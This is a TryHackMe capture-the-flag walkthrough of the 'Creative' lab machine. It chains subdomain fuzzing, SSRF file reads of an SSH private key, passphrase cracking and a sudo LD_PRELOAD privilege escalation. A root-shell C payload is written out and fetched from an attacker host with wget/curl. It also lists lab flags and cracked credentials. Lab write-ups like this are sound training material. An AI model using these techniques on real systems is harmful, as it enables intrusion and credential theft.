---
title: 'TryHackMe - Creative'
author: r2cook
categories: [TryHackMe]
tags: [ vhost, hydra, SSRF, ssrfmap, PrivEsc, LD_PRELOAD, shared-object-injection]
render_with_liquid: false
media_subpath: /images/thm/Creative/
image:
  path: room_card.svg
---

> In this walkthrough, we compromise the TryHackMe **Creative** machine by chaining **subdomain discovery, web application abuse, internal service pivoting, credential recovery, secure-shell foothold acquisition, and Linux privilege escalation**, progressing from a hidden beta feature to full root compromise while capturing both flags.

## Initial Setup

Add the target to your hosts file:

```plaintext
10.128.165.17 creative.thm
```
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

```shell
nmap -p- -sV -sC -Pn --min-rate 1000 -oN full_nmap_scan.txt creative.thm
```
{: .nolineno }

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-31 21:19 EET  
Nmap scan report for creative.thm (10.128.165.17)  
Host is up (0.056s latency).  

Not shown: 65533 filtered tcp ports (no-response)  

PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11  
80/tcp open  http    nginx 1.18.0 (Ubuntu)  

Service Info: OS: Linux  
```

### Command Breakdown

- `-p-` → scan all ports (1–65535)
    
- `-sV` → detect service versions
    
- `-sC` → run default NSE scripts
    
- `-Pn` → skip host discovery
    
- `--min-rate 1000` → faster scan
    
- `-oN` → save output to file
    

### Key Findings

- SSH (22)
    
- HTTP (80)
    

---

## Web Enumeration (Port 80)

![](web_portal_80.webp){: width="800" height="400" .shadow }


Initial inspection shows a normal landing page with no obvious attack surface.

---

### Subdomain Fuzzing

Baseline response size:

```shell
curl -s -H "Host: doesntexist.creative.thm" http://creative.thm | wc -c
```
{: .nolineno }

```
178
```

Fuzz subdomains:

```shell
ffuf -u http://creative.thm -H "Host: FUZZ.creative.thm" \
-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
-fs 178 -c | tee fuff_subdomain_result.txt
```
{: .nolineno }

### Result

```
beta   [Status: 200, Size: 591]
```

---

### Add Subdomain

```plaintext
10.128.165.17 creative.thm beta.creative.thm
```
{: file="/etc/hosts" }

---

### Access Beta

![](beta_subdomain_web_portal.webp){: width="800" height="400" .shadow }

![](beta_url_tester_burp1.webp){: width="800" height="400" .shadow }

The `beta` subdomain contains a **URL testing feature**, which suggests a possible **SSRF vulnerability**.

---

## SSRF Exploitation

Captured request:

```http
POST / HTTP/1.1
Host: beta.creative.thm
Content-Type: application/x-www-form-urlencoded

url=http://localhost/admin
```

Save as:

```shell
request.txt
```
{: .nolineno }

---

### Internal Port Discovery

Using `ssrfmap`:

```shell
ssrfmap -r request.txt -p url -m portscan
```
{: .nolineno }

```
Found open port: 1337
```

---

### Alternative (Manual with FFUF)

```shell
seq 65535 > ports.txt

ffuf -w ports.txt -u http://beta.creative.thm/ \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "url=http://127.0.0.1:FUZZ" \
-fw 3
```
{: .nolineno }

---

## Access Internal Service

![](beta_url_tester_open_port1.webp){: width="800" height="400" .shadow }

![](beta_url_tester_open_port1_resp.webp){: width="800" height="400" .shadow }

![](beta_url_tester_open_port1_home.webp){: width="800" height="400" .shadow }

![](beta_url_tester_open_port1_home_resp.webp){: width="800" height="400" .shadow }

![](beta_url_tester_open_port1_home_saad.webp){: width="800" height="400" .shadow }

![](beta_url_tester_open_port1_home_saad_resp.webp){: width="800" height="400" .shadow }

*Internal service allows reading local files.*

---

## Reading Sensitive Files

### User Flag

```
http://localhost:1337/home/saad/user.txt
```

```
9a1ce90a7653d74ab98630b47b8b4a84
```

---

### Hint / Thought Process

At this stage, we confirmed we can **read files via SSRF**.

> If we can read files, maybe we can read SSH credentials.

A logical next step is:

- `/home/saad/.ssh/id_rsa`
    

---

### Extract SSH Key

```
http://localhost:1337/home/saad/.ssh/id_rsa
```

---

## Crack SSH Key

Save key:

```shell
cat > id_rsa << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
EOF
```
{: .nolineno }

Permissions:

```shell
chmod 600 id_rsa
```
{: .nolineno }

Convert:

```shell
ssh2john.py id_rsa > key.hash
```
{: .nolineno }

Crack:

```shell
john key.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
{: .nolineno }

### Result

```
sweetness
```

---

## Foothold

```shell
ssh -i id_rsa saad@creative.thm
```
{: .nolineno }

Enter passphrase:

```
sweetness
```

---

## Enumeration

```shell
cat .bash_history
```
{: .nolineno }

### Interesting

```
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
```

Check sudo:

```shell
sudo -l
```
{: .nolineno }

```shell
(root) /usr/bin/ping
env_keep+=LD_PRELOAD
```
{: .nolineno }

---

## Privilege Escalation (Sudo LD_PRELOAD Shared Library Injection)

The `sudo -l` output revealed a dangerous misconfiguration:

```shell
(root) /usr/bin/ping
env_keep+=LD_PRELOAD
```
{: .nolineno }

This means the user can run `/usr/bin/ping` as `root`, while preserving the `LD_PRELOAD` environment variable.

Under normal conditions, sudo sanitizes most environment variables before executing privileged commands.

However, because `LD_PRELOAD` is explicitly preserved, we can force the dynamic linker to load a user-controlled shared library before any system libraries.

This is dangerous because the shared object can contain code that executes automatically when the binary starts.

### Why this works

`LD_PRELOAD` is a *Linux environment variable* used by the **dynamic linker**.

It allows loading a custom `.so` file before the standard libraries.

If the loaded library contains an `_init()` function, that function runs immediately when the process starts.

Because `sudo` launches the target binary as root, our malicious `_init()` function will also execute as root.

This gives us arbitrary code execution with full privileges.

---

### Step 1 — On Local (Create Payload)

```shell
nano shell.c
```
{: .nolineno }

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

---

### Step 2 — On Local (Compile)

```shell
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
{: .nolineno }

---
### Step 3 — On Local (Serve File)

Start a simple HTTP server to transfer the payload:
```shell
python3 -m http.server 8000
```
{: .nolineno }

---
### Step 4 — On Target (Download Payload)

On the target machine, download the shared library:

```shell
wget http://<YOUR-IP>:8000/shell.so
```
{: .nolineno }

or (if `wget` is not available):

```shell
curl -O http://<YOUR-IP>:8000/shell.so
```
{: .nolineno }

---

### Step 5 — On Target (Exploit)

```shell
sudo LD_PRELOAD=$PWD/shell.so /usr/bin/ping
```
{: .nolineno }

---

## Root

```shell
whoami
```
{: .nolineno }

```
root
```

---

### Root Flag

```shell
cat /root/root.txt
```
{: .nolineno }

```
992bfd94b90da48634aed182aae7b99f
```

---